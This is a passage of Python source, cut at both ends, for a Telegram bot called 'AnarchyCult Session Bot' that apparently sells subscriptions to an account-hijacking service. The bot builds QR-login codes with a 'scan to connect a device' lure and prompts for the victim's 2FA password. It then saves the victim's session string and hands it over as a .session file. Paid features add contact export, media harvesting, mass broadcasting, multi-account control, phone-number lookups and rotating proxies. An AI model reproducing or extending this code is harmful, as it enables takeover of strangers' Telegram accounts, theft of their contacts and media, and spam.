            "last_name": u.last_name or "", "phone": u.phone or "",
        } for u in users]
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(rows, f, ensure_ascii=False, indent=2)
        with open(csv_path, "w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=["id", "username", "first_name", "last_name", "phone"])
            writer.writeheader()
            writer.writerows(rows)
        return {"total": len(rows), "json": json_path, "csv": csv_path}

class GeoProfiler:
    def profile_phone(self, phone: str):
        import phonenumbers
        from phonenumbers import carrier, geocoder, timezone
        cleaned = phone.strip()
        if not cleaned.startswith("+"):
            cleaned = "+" + cleaned
        try:
            parsed = phonenumbers.parse(cleaned, None)
        except phonenumbers.NumberParseException:
            return {"valid": False, "phone": phone}
        if not phonenumbers.is_valid_number(parsed):
            return {"valid": False, "phone": phone}
        return {
            "valid": True,
            "phone": cleaned,
            "country": geocoder.description_for_number(parsed, "en") or "N/A",
            "city": geocoder.description_for_number(parsed, "ru") or "N/A",
            "carrier": carrier.name_for_number(parsed, "en") or "N/A",
            "timezone": ", ".join(timezone.time_zones_for_number(parsed)) or "N/A",
            "number_type": str(phonenumbers.number_type(parsed)),
        }

def get_main_menu(user_id):
    is_adm = (user_id == ADMIN_ID)
    is_sub = has_sub(user_id)
    _, trial_used, _, _ = get_user_data(user_id)
    keyboard = [
        [InlineKeyboardButton("📱 Получить сессию", callback_data="get_session"),
         InlineKeyboardButton("📊 Статус", callback_data="status")],
        [InlineKeyboardButton("👥 Мульти (Paid)", callback_data="multi"),
         InlineKeyboardButton("📢 Рассылка (Paid)", callback_data="broadcast")],
        [InlineKeyboardButton(" Сбор медиа (Paid)", callback_data="harvest"),
         InlineKeyboardButton("📇 Контакты (Paid)", callback_data="export")],
        [InlineKeyboardButton("📞 Профиль (Free)", callback_data="profile"),
         InlineKeyboardButton("🗑 Очистить", callback_data="clear")],
        [InlineKeyboardButton("🔌 Мой прокси", callback_data="my_proxies"),
         InlineKeyboardButton("👥 Пригласить друга", callback_data="ref_link")],
        [InlineKeyboardButton("🛑 Отмена", callback_data="cancel")],
    ]
    if is_adm:
        keyboard.append([InlineKeyboardButton(" Админ-панель", callback_data="admin_panel")])
    elif not is_sub:
        if not trial_used:
            keyboard.insert(0, [InlineKeyboardButton("🎁 Пробный период", callback_data="start_trial")])
        keyboard.append([InlineKeyboardButton("💳 Купить подписку", url=BUY_LINK)])
    return InlineKeyboardMarkup(keyboard)

def get_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton("📜 История действий", callback_data="admin_history")],
        [InlineKeyboardButton(" Выдать подписку", callback_data="admin_grant")],
        [InlineKeyboardButton(" Рассылка новым юзерам", callback_data="admin_broadcast_recent")],
        [InlineKeyboardButton("⚙️ Настройки", callback_data="admin_settings")],
        [InlineKeyboardButton("🔙 Назад", callback_data="admin_back")],
    ])

def get_settings_menu():
    qr_time = get_qr_timeout()
    trial_status = "Вкл ✅" if get_setting("trial_enabled", "1") == "1" else "Выкл ❌"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"⏱ Срок QR по умолчанию ({qr_time} сек)", callback_data="admin_set_qr")],
        [InlineKeyboardButton(f" Пробный период: {trial_status}", callback_data="admin_toggle_trial")],
        [InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]
    ])

def get_proxy_menu(user_id):
    proxies = list_user_proxies(user_id)
    rows = []
    for p in proxies:
        label = p.get("label") or f"{p['server']}:{p['port']}"
        rows.append([InlineKeyboardButton(f"❌ {label}", callback_data=f"proxy_del_{p['id']}")])
    rows.append([InlineKeyboardButton("➕ Добавить прокси", callback_data="proxy_add")])
    if proxies:
        rows.append([InlineKeyboardButton("🚀 Генерировать QR через выбранный прокси", callback_data="proxy_pick")])
    rows.append([InlineKeyboardButton("🔙 Назад", callback_data="admin_back")])
    return InlineKeyboardMarkup(rows)

def get_proxy_pick_menu(user_id):
    proxies = list_user_proxies(user_id)
    rows = []
    for p in proxies:
        label = p.get("label") or f"{p['server']}:{p['port']}"
        rows.append([InlineKeyboardButton(f"➡️ {label}", callback_data=f"proxy_use_{p['id']}")])
    rows.append([InlineKeyboardButton("🔙 Назад", callback_data="my_proxies")])
    return InlineKeyboardMarkup(rows)

async def animate_qr_progress(message, qr_timeout: int):
    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed >= qr_timeout:
            break
        remaining = int(qr_timeout - elapsed)
        progress_pct = min(int((elapsed / qr_timeout) * 100), 100)
        blocks = progress_pct // 10
        bar = "🟩" * blocks + "⬜" * (10 - blocks)
        text = (
            "📱 Отсканируйте QR-код для подключения устройства\n\n"
            f"⏳ {bar} {progress_pct}%\n"
            f"⏱ Осталось: {remaining} сек.\n\n"
            "📌 Если QR не сканируется, скопируйте ссылку и вставьте в браузер на телефоне\n"
            "📌 При запросе 2FA отправьте пароль текстом"
        )
        try:
            await message.edit_caption(caption=text, parse_mode="HTML")
        except Exception:
            pass
        await asyncio.sleep(5)

class TelegramBotController:
    def __init__(self, bot_token: str) -> None:
        self.bot_token = bot_token
        self.application = None
        self.pending_sessions = {}
        self.session_files = {}
        self.waiting_for_2fa = {}
        self.multi_clients = {}

    def is_admin(self, update: Update) -> bool:
        if not update.effective_user:
            return False
        return update.effective_user.id == ADMIN_ID

    async def start_bot(self):
        db_init()
        await load_or_refresh_proxies()
        for attempt in range(8):
            try:
                _log(f"Попытка запуска PTB {attempt + 1}/8...")
                req = build_ptb_request()
                self.application = (
                    Application.builder()
                    .token(self.bot_token)
                    .request(req)
                    .get_updates_request(req)
                    .build()
                )
                self.application.add_handler(CommandHandler("start", self.start_command))
                self.application.add_handler(CommandHandler("grant", self.grant_command))
                self.application.add_handler(CommandHandler("revoke", self.revoke_command))
                self.application.add_handler(CallbackQueryHandler(self.button_callback))
                self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
                self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text))
                self.application.add_error_handler(self.error_handler)
                await self.application.initialize()
                await self.application.start()
                await self.application.updater.start_polling(drop_pending_updates=False)
                _log("✅ Бот запущен и слушает обновления")
                asyncio.create_task(proxy_rotator_loop())
                asyncio.create_task(watchdog_loop(self.application))
                return self.application
            except Exception as e:
                _log(f"❌ Ошибка запуска попытка {attempt + 1}: {e}")
                if self.application:
                    try:
                        await self.application.shutdown()
                    except Exception:
                        pass
                p = get_ptb_proxy()
                if p:
                    purge_dead_proxy(p)
                rotate_ptb_proxy()
                await asyncio.sleep(2)
        return None

    async def error_handler(self, update, context):
        try:
            raise context.error
        except (TimedOut, NetworkError, TelegramError) as e:
            err_msg = str(e).lower()
            if "query is too old" in err_msg or "query id is invalid" in err_msg or "message is not modified" in err_msg:
                return
            p = get_ptb_proxy()
            if p:
                purge_dead_proxy(p)
            rotate_ptb_proxy()
        except RetryAfter as e:
            if isinstance(update, Update) and update.effective_message:
                try:
                    await update.effective_message.reply_text(f"⏱ Слишком много запросов. Подождите {e.retry_after} секунд.")
                except Exception:
                    pass
        except BadRequest as e:
            err_msg = str(e).lower()
            if "query is too old" in err_msg or "query id is invalid" in err_msg or "message is not modified" in err_msg:
                return
        except Exception as e:
            if isinstance(update, Update) and update.effective_message:
                try:
                    await update.effective_message.reply_text(f"❌ Ошибка: {e}")
                except Exception:
                    pass

    async def button_callback(self, update, context):
        query = update.callback_query
        try:
            await query.answer()
        except Exception:
            pass
        user_id = update.effective_user.id
        data = query.data
        chat_id = update.effective_chat.id

        if data == "admin_back":
            try:
                await query.message.edit_text(
                    " <b>AnarchyCult Session Bot</b>\n\nВыберите действие на панели ниже:",
                    parse_mode="HTML", reply_markup=get_main_menu(user_id))
            except Exception:
                await context.bot.send_message(chat_id, " <b>AnarchyCult Session Bot</b>", parse_mode="HTML", reply_markup=get_main_menu(user_id))
            return

        if data == "my_proxies":
            if not has_sub(user_id) and not self.is_admin(update):
                await context.bot.send_message(chat_id, f"❌ Требуется подписка. Купите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                return
            proxies = list_user_proxies(user_id)
            text = "🔌 <b>Мои прокси</b>\n\n"
            if proxies:
                for p in proxies:
                    label = p.get("label") or "-"
                    text += f"• <code>{p['type']}://{p['server']}:{p['port']}</code> — {label}\n"
                text += f"\nВсего: {len(proxies)}/{MAX_USER_PROXIES}"
            else:
                text += "Список пуст. Добавьте прокси, чтобы генерация QR шла через него."
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
            return

        if data == "proxy_add":
            if not has_sub(user_id) and not self.is_admin(update):
                await context.bot.send_message(chat_id, "❌ Требуется подписка.", parse_mode="HTML")
                return
            if len(list_user_proxies(user_id)) >= MAX_USER_PROXIES:
                await query.answer(f"Лимит {MAX_USER_PROXIES} прокси", show_alert=True)
                return
            context.user_data['waiting_for_proxy'] = True
            text = (
                "📥 <b>Добавление прокси</b>\n\n"
                "Отправь одну строку — поддерживается:\n"
                "• <code>tg://proxy?server=HOST&port=PORT&secret=SECRET</code>\n"
                "• <code>https://t.me/proxy?server=HOST&port=PORT&secret=SECRET</code>\n"
                "• <code>HOST:PORT:SECRET</code> (MTProto)\n"
                "• <code>socks5://user:pass@host:port</code>\n"
                "• <code>host:port</code> (SOCKS5 без авторизации)\n\n"
                "Можно добавить метку через <code>| метка</code> в конце."
            )
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data="my_proxies")]])
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data.startswith("proxy_del_"):
            if not has_sub(user_id) and not self.is_admin(update):
                return
            pid = int(data.split("_")[2])
            ok = delete_user_proxy(user_id, pid)
            await query.answer("Удалено" if ok else "Не найдено")
            proxies = list_user_proxies(user_id)
            text = "🔌 <b>Мои прокси</b>\n\n"
            if proxies:
                for p in proxies:
                    label = p.get("label") or "-"
                    text += f"• <code>{p['type']}://{p['server']}:{p['port']}</code> — {label}\n"
                text += f"\nВсего: {len(proxies)}/{MAX_USER_PROXIES}"
            else:
                text += "Список пуст."
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_proxy_menu(user_id))
            return

        if data == "proxy_pick":
            if not has_sub(user_id) and not self.is_admin(update):
                return
            if not list_user_proxies(user_id):
                await query.answer("Сначала добавь прокси", show_alert=True)
                return
            try:
                await query.message.edit_text("🚀 <b>Выбери прокси для генерации QR</b>", parse_mode="HTML", reply_markup=get_proxy_pick_menu(user_id))
            except Exception:
                await context.bot.send_message(chat_id, "🚀 <b>Выбери прокси для генерации QR</b>", parse_mode="HTML", reply_markup=get_proxy_pick_menu(user_id))
            return

        if data.startswith("proxy_use_"):
            if not has_sub(user_id) and not self.is_admin(update):
                return
            pid = int(data.split("_")[2])
            proxy = get_user_proxy_by_id(user_id, pid)
            if not proxy:
                await query.answer("Прокси не найден", show_alert=True)
                return
            try:
                await query.message.edit_reply_markup(reply_markup=None)
            except Exception:
                pass
            await self.get_session_command(update, context, timeout_override=None, user_proxy=proxy)
            return

        if data == "admin_broadcast_recent":
            if not self.is_admin(update):
                return
            if ADMIN_ID not in self.session_files:
                await context.bot.send_message(chat_id, "❌ Нет активной сессии админа для рассылки. Используйте /get_session.", reply_markup=get_admin_menu())
                return
            context.user_data['admin_waiting_for_broadcast_text'] = True
            text = "📢 <b>Рассылка новым юзерам</b>\n\nОтправьте текст сообщения (будет отправлен всем, кто зашел за последние 24 часа):"
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data="admin_panel")]])
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data == "ref_link":
            bot_username = (await context.bot.get_me()).username
            ref_link = f"https://t.me/{bot_username}?start=ref_{user_id}"
            _, _, _, ref_count = get_user_data(user_id)
            text = (
                f"👥 <b>Реферальная система (Бета)</b>\n\n"
                f"Пригласите друга по ссылке и получите <b>20 минут</b> доступа к основным функциям (кроме Paid).\n"
                f"Лимит: 5 приглашений.\n\n"
                f"🔗 Ваша ссылка:\n<code>{ref_link}</code>\n\n"
                f"📊 Приглашено: {ref_count}/5"
            )
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="admin_back")]])
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data == "admin_settings":
            if not self.is_admin(update):
                return
            try:
                await query.message.edit_text("⚙️ <b>Настройки бота</b>\n\nВыберите параметр:", parse_mode="HTML", reply_markup=get_settings_menu())
            except Exception:
                await context.bot.send_message(chat_id, "⚙️ <b>Настройки бота</b>", parse_mode="HTML", reply_markup=get_settings_menu())
            return

        if data == "admin_toggle_trial":
            if not self.is_admin(update):
                return
            current = get_setting("trial_enabled", "1")
            set_setting("trial_enabled", "0" if current == "1" else "1")
            try:
                await query.message.edit_reply_markup(reply_markup=get_settings_menu())
            except Exception:
                pass
            return

        if data == "admin_set_qr":
            if not self.is_admin(update):
                return
            context.user_data['admin_waiting_for_qr_timeout'] = True
            text = " <b>Срок QR-кода по умолчанию</b>\n\nОтправьте количество секунд (например, <code>240</code> или <code>300</code>):"
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data="admin_settings")]])
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data == "admin_grant":
            if not self.is_admin(update):
                return
            context.user_data['admin_waiting_for_id'] = True
            text = "🎁 <b>Выдача подписки</b>\n\nОтправьте <code>user_id</code> пользователя в чат:"
            markup = InlineKeyboardMarkup([[InlineKeyboardButton(" Отмена", callback_data="admin_panel")]])
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data.startswith("grant_sub_"):
            if not self.is_admin(update):
                return
            parts = data.split("_")
            target_id = int(parts[2])
            days = int(parts[3])
            register_user(target_id, "", "")
            sub_until = (datetime.now() + timedelta(days=days)).isoformat()
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("UPDATE users SET sub_until = ?, sub_type = 2 WHERE user_id = ?", (sub_until, target_id))
            conn.commit()
            conn.close()
            log_action(user_id, f"Выдал подписку {target_id} на {days} дней")
            text = f"✅ Пользователю <code>{target_id}</code> выдана подписка на {days} дней!"
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=get_admin_menu())
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_menu())
            try:
                exp_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M')
                await context.bot.send_message(target_id, f"🎉 Вам выдана полная подписка на {days} дней!\n Действует до: {exp_date}\nНажмите /start для обновления.")
            except Exception:
                pass
            return

        if data.startswith("admin_"):
            if not self.is_admin(update):
                return
            if data == "admin_panel":
                try:
                    await query.message.edit_text(" <b>Админ-панель</b>\n\nВыберите раздел:", parse_mode="HTML", reply_markup=get_admin_menu())
                except Exception:
                    await context.bot.send_message(chat_id, " <b>Админ-панель</b>", parse_mode="HTML", reply_markup=get_admin_menu())
                return
            if data == "admin_users":
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT user_id, username, first_name, sub_until, ref_count FROM users ORDER BY joined_at DESC LIMIT 20")
                rows = c.fetchall()
                conn.close()
                text = "👥 <b>Последние 20 пользователей:</b>\n\n"
                for r in rows:
                    sub = "✅ Есть" if r[3] else " Нет"
                    text += f"🆔 <code>{r[0]}</code> | @{r[1] or 'нет'} | {r[2] or 'Без имени'} | Подписка: {sub} | Реф: {r[4]}\n"
                try:
                    await query.message.edit_text(text, parse_mode="HTML", reply_markup=get_admin_menu())
                except Exception:
                    await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_menu())
                return
            if data == "admin_history":
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT user_id, action, timestamp FROM history ORDER BY id DESC LIMIT 30")
                rows = c.fetchall()
                conn.close()
                text = "📜 <b>Последние 30 действий:</b>\n\n"
                for r in rows:
                    try:
                        t = datetime.fromisoformat(r[2]).strftime("%m-%d %H:%M")
                    except Exception:
                        t = r[2]
                    text += f"<code>{t}</code> | 🆔 <code>{r[0]}</code> | {r[1]}\n"
                try:
                    await query.message.edit_text(text, parse_mode="HTML", reply_markup=get_admin_menu())
                except Exception:
                    await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=get_admin_menu())
                return

        if data == "cancel":
            await self.cancel_command(update, context)
            return

        if data == "start_trial":
            if not self.is_admin(update) and not has_sub(user_id):
                _, trial_used, _, _ = get_user_data(user_id)
                if not trial_used and get_setting("trial_enabled", "1") == "1":
                    set_trial_used(user_id)
                    log_action(user_id, "Активировал пробный период")
                    text = "🎁 <b>Пробный период активирован!</b>\n\nВам доступна 1 бесплатная генерация QR-кода.\n\n⏳ Нажмите «Получить сессию» в меню."
                    markup = InlineKeyboardMarkup([[InlineKeyboardButton("📱 Получить сессию", callback_data="get_session")]])
                    try:
                        await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
                    except Exception:
                        await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
                    return
                else:
                    await query.answer("Вы уже использовали пробный период.", show_alert=True)
                    return

        if data == "get_session":
            if not has_sub(user_id) and not self.is_admin(update):
                _, trial_used, _, _ = get_user_data(user_id)
                if not trial_used and get_setting("trial_enabled", "1") == "1":
                    set_trial_used(user_id)
                    log_action(user_id, "Активировал пробный период при генерации")
                elif trial_used:
                    await context.bot.send_message(chat_id, f"❌ У вас закончился пробный период. Купите подписку у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                    return
                else:
                    await context.bot.send_message(chat_id, f"⚠️ Демо-режим. Купите подписку у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
                    return
            keyboard = [
                [InlineKeyboardButton("1 мин", callback_data="qr_t_60"), InlineKeyboardButton("2 мин", callback_data="qr_t_120")],
                [InlineKeyboardButton("3 мин", callback_data="qr_t_180"), InlineKeyboardButton("4 мин", callback_data="qr_t_240")],
                [InlineKeyboardButton("5 мин", callback_data="qr_t_300")],
                [InlineKeyboardButton("🔌 Через мой прокси", callback_data="proxy_pick")],
                [InlineKeyboardButton("🔙 Отмена", callback_data="cancel")]
            ]
            text = "⏱ <b>Выберите срок действия QR-кода:</b>"
            markup = InlineKeyboardMarkup(keyboard)
            try:
                await query.message.edit_text(text, parse_mode="HTML", reply_markup=markup)
            except Exception:
                await context.bot.send_message(chat_id, text, parse_mode="HTML", reply_markup=markup)
            return

        if data.startswith("qr_t_"):
            seconds = int(data.split("_")[2])
            try:
                await query.message.edit_reply_markup(reply_markup=None)
            except Exception:
                pass
            await self.get_session_command(update, context, timeout_override=seconds)
            return

        if not has_sub(user_id) and not self.is_admin(update) and data != "profile":
            await context.bot.send_message(chat_id, f"❌ Требуется подписка. Купите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
            return

        if data in ("multi", "broadcast", "harvest", "export") and not has_paid_sub(user_id) and not self.is_admin(update):
            await context.bot.send_message(chat_id, f"🔒 <b>Функция доступна только с полной подпиской.</b>\n\nКупите у {BUY_CONTACT} или <a href='{BUY_LINK}'>тут</a>.", parse_mode="HTML", disable_web_page_preview=True)
            return

        if data == "status":
            await self.status_command(update, context)
        elif data == "clear":
            await self.clear_command(update, context)
        elif data == "multi":
            await context.bot.send_message(chat_id, "📌 Отправьте команду: <code>/multi &lt;кол-во&gt;</code>\nПример: <code>/multi 5</code>", parse_mode="HTML")
        elif data == "broadcast":
            await context.bot.send_message(chat_id, "📌 Отправьте команду: <code>/broadcast &lt;текст&gt;</code>\nПример: <code>/broadcast Всем привет!</code>", parse_mode="HTML")
        elif data == "harvest":
            await context.bot.send_message(chat_id, "📌 Отправьте команду: <code>/harvest &lt;@username или ID&gt; &lt;лимит&gt;</code>\nПример: <code>/harvest @durov 100</code>", parse_mode="HTML")
        elif data == "export":
            await self.export_command(update, context)
        elif data == "profile":
            await context.bot.send_message(chat_id, "📌 Отправьте команду: <code>/profile &lt;номер&gt;</code>\nПример: <code>/profile +79123456789</code>\n\n💡 <i>(Бесплатно для всех)</i>", parse_mode="HTML")

    async def start_command(self, update, context):
        user = update.effective_user
        is_new = False
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT 1 FROM users WHERE user_id=?", (user.id,))
        if not c.fetchone():
            is_new = True
        conn.close()
        if is_new and context.args and context.args[0].startswith("ref_"):
            try:
                inviter_id = int(context.args[0].split("_")[1])
                if inviter_id != user.id:
                    _, _, _, inviter_ref_count = get_user_data(inviter_id)
                    if inviter_ref_count < 5:
                        add_ref_time(inviter_id, 20)
                        try:
                            await context.bot.send_message(
                                inviter_id,
                                f" По вашей ссылке зашел новый пользователь!\n"
                                f"Вам начислено 20 минут подписки.\n"
                                f"Ваш прогресс: {inviter_ref_count + 1}/5"
                            )
                        except Exception:
                            pass
            except Exception:
                pass
        register_user(user.id, user.username, user.first_name)
        log_action(user.id, "Запуск бота /start")
        p = get_active_proxy()
        proxy_str = f"{p['type']}://{p['server']}:{p['port']}" if p else "🔄 Auto"
        sub_info = get_sub_info(user.id)
        text = (
            " <b>AnarchyCult Session Bot</b>\n\n"
            f"📡 Текущий режим: <code>{proxy_str}</code>\n"
            f"💳 Ваша подписка: {sub_info}\n"
        )
        if not self.is_admin(update) and not has_sub(user.id):
            text += "\n💡 Используйте <code>/profile &lt;номер&gt;</code> для бесплатного пробива.\n"
            text += f"💳 Для доступа к Paid-функциям напишите {BUY_CONTACT}."
        await update.effective_message.reply_text(text, parse_mode="HTML", reply_markup=get_main_menu(user.id), disable_web_page_preview=True)

    async def grant_command(self, update, context):
        if not self.is_admin(update):
            return
        args = context.args
        if len(args) < 2:
            await update.effective_message.reply_text("📌 Использование: <code>/grant &lt;user_id&gt; &lt;дней&gt;</code>", parse_mode="HTML")
            return
        try:
            target_id = int(args[0])
            days = int(args[1])
        except ValueError:
            await update.effective_message.reply_text(" Неверный формат ID или дней.")
            return
        register_user(target_id, "", "")
        sub_until = (datetime.now() + timedelta(days=days)).isoformat()
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET sub_until = ?, sub_type = 2 WHERE user_id = ?", (sub_until, target_id))
        conn.commit()
        conn.close()
        await update.effective_message.reply_text(f"✅ Пользователю <code>{target_id}</code> выдана подписка на {days} дней.", parse_mode="HTML")

    async def revoke_command(self, update, context):
        if not self.is_admin(update):
            return
        args = context.args
        if not args:
            await update.effective_message.reply_text("📌 Использование: <code>/revoke &lt;user_id&gt;</code>", parse_mode="HTML")
            return
        try:
            target_id = int(args[0])
        except ValueError:
            await update.effective_message.reply_text("❌ Неверный формат ID.")
            return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET sub_until = NULL, sub_type = 0 WHERE user_id = ?", (target_id,))
        conn.commit()
        conn.close()
        await update.effective_message.reply_text(f"✅ У пользователя <code>{target_id}</code> отозвана подписка.", parse_mode="HTML")

    async def cancel_command(self, update, context):
        user_id = update.effective_user.id
        context.user_data.pop('waiting_for_proxy', None)
        if user_id in self.waiting_for_2fa:
            session_id = self.waiting_for_2fa[user_id]
            session = self.pending_sessions.pop(session_id, None)
            if session:
                try:
                    await session["client"].disconnect()
                except Exception:
                    pass
            del self.waiting_for_2fa[user_id]
            await update.effective_message.reply_text("✅ Операция отменена")
        else:
            try:
                await update.callback_query.message.delete()
            except Exception:
                pass

    async def _do_qr_attempt(self, context, chat_id, user_id, session_id, qr_timeout, proxy):
        client = None
        try:
            client = build_client(StringSession(), user_proxy=proxy)
            await asyncio.wait_for(client.connect(), timeout=15.0)
            if await client.is_user_authorized():
                try:
                    await client.disconnect()
                except Exception:
                    pass
                return {"status": "authorized"}
            qr_login = await asyncio.wait_for(client.qr_login(), timeout=15.0)
            qr = qrcode.QRCode(box_size=10, border=4)
            qr.add_data(qr_login.url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img_bytes = io.BytesIO()
            img.save(img_bytes, format="PNG")
            img_bytes.seek(0)
            escaped_url = html.escape(qr_login.url)
            initial_text = (
                "📱 Отсканируйте QR-код для подключения устройства\n\n"
                f"🔗 Альтернативная ссылка:\n<code>{escaped_url}</code>\n\n"
                "⏳ Начинаем отсчет...\n\n"
                "📌 При запросе 2FA отправьте пароль текстом"
            )
            sent_msg = await context.bot.send_photo(chat_id=chat_id, photo=img_bytes, caption=initial_text, parse_mode="HTML")
            self.pending_sessions[session_id] = {
                "user_id": user_id, "client": client, "qr_login": qr_login,
                "user_proxy": proxy, "timestamp": time.time(),
            }
            progress_task = asyncio.create_task(animate_qr_progress(sent_msg, qr_timeout))
            try:
                await qr_login.wait(timeout=qr_timeout)
                progress_task.cancel()
                me = await client.get_me()
                session_string = StringSession.save(client.session)
                result = await client(functions.account.GetAuthorizationsRequest())
                self.session_files[user_id] = {
                    "session_string": session_string,
                    "user_info": {
                        "id": me.id, "username": me.username,
                        "first_name": me.first_name, "phone": me.phone,
                    },
                    "devices": len(result.authorizations),
                    "timestamp": datetime.now().isoformat(),
                }
                try:
                    await sent_msg.edit_caption(
                        caption=(
                            f"✅ Устройство успешно подключено!\n\n"
                            f"👤 Пользователь: {me.first_name}\n"
                            f"🆔 ID: {me.id}\n"
                            f"📱 Username: @{me.username}\n"
                            f"📞 Телефон: {me.phone}\n"
                            f" Устройств: {len(result.authorizations)}\n\n"
                            f"🔑 Строка сессии сохранена"
                        ),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
                session_file = save_session_file(user_id, me.id, session_string)
                with open(session_file, "rb") as f:
                    await context.bot.send_document(
                        chat_id=chat_id, document=f,
                        filename=f"session_{me.id}.session",
                        caption=f"✅ Сессия для @{me.username} сохранена",
                    )
                self.waiting_for_2fa.pop(user_id, None)
                return {"status": "success", "session": session_string}
            except asyncio.TimeoutError:
                progress_task.cancel()
                try:
                    await sent_msg.edit_caption(caption="⏱ <b>Время ожидания истекло.</b>", parse_mode="HTML")
                except Exception:
                    pass
                return {"status": "timeout"}
            except errors.SessionPasswordNeededError:
                progress_task.cancel()
                self.waiting_for_2fa[user_id] = session_id
                try:
                    await sent_msg.edit_caption(caption="🔐 <b>Требуется пароль 2FA.</b>\n\nОтправьте пароль текстом.", parse_mode="HTML")
                except Exception:
                    pass
                return {"status": "2fa"}
        except Exception as e:
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
            return {"status": "fail", "error": str(e)}

    async def get_session_command(self, update, context, timeout_override=None, user_proxy=None):
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        log_action(user_id, "Запрос QR-сессии" + (" через пользовательский прокси" if user_proxy else ""))
        qr_timeout = timeout_override if timeout_override else get_qr_timeout()
        base_id = int(time.time())

        async def _say(msg):
            try:
                await context.bot.send_message(chat_id, msg, parse_mode="HTML")
            except Exception:
                pass

        if user_proxy:
            attempt_proxies = [user_proxy] * 5
            await _say(f"🔌 Генерация QR через твой прокси {user_proxy['type']}://{user_proxy['server']}:{user_proxy['port']}...")
        else:
            attempt_proxies = []
            for _ in range(5):
                fp = get_fast_proxy()
                if fp:
                    attempt_proxies.append(fp)
            if not attempt_proxies:
                attempt_proxies.append(None)
            await _say("🔄 Генерация QR через авто-пул...")

        for i, p in enumerate(attempt_proxies):
            sid = f"{user_id}_{base_id}_{i}"
            if i > 0:
                if p:
                    await _say(f"🔄 Попытка {i + 1}/5 через {p['type']}://{p['server']}:{p['port']}...")
                else:
                    await _say(f"🔄 Попытка {i + 1}/5...")
            result = await self._do_qr_attempt(context, chat_id, user_id, sid, qr_timeout, p)
            status = result.get("status")
            if status == "success":
                return result.get("session")
            if status == "2fa":
                return None
            if status == "timeout":
                return None
            if status == "authorized":
                await _say("⚠️ Сессия уже авторизована.")
                return None
            if p and not user_proxy and p in active_proxies:
                purge_dead_proxy(p)
            await asyncio.sleep(0.5)

        if user_proxy:
            await _say("❌ Не удалось подключиться через твой прокси. Попробуй другой или используй авто-пул.")
            return None

        await _say("⚠️ Авто-пул не справился, пробую резервные прокси...")
        for i, sp in enumerate(STATIC_MT_PROXIES):
            sid = f"{user_id}_{base_id}_fb{i}"
            await _say(f"🛟 Резерв {i + 1}/{len(STATIC_MT_PROXIES)} → {sp['type']}://{sp['server']}:{sp['port']}...")
            result = await self._do_qr_attempt(context, chat_id, user_id, sid, qr_timeout, sp)
            status = result.get("status")
            if status == "success":
                return result.get("session")
            if status in ("2fa", "timeout"):
                return None
            if status == "authorized":
                await _say("⚠️ Сессия уже авторизована.")
                return None
            await asyncio.sleep(0.5)

        await _say("❌ Все прокси (авто + резерв) не ответили. Попробуй позже или добавь свой прокси.")
        return None

    async def multi_account_command(self, update, context):
        user_id = update.effective_user.id
        log_action(user_id, "Мульти-аккаунты")
        args = context.args
        if not args:
